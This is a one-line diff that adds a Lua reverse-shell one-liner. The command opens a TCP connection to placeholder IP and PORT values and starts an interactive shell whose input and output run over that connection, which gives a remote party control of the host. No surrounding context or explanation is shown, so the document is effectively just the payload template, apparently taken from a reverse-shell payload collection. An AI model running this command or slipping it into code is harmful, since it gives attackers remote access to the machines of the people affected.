@@ -1,0 +1,1 @@
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('IP','PORT');os.execute('SHELL -i <&3 >&3 2>&3');"
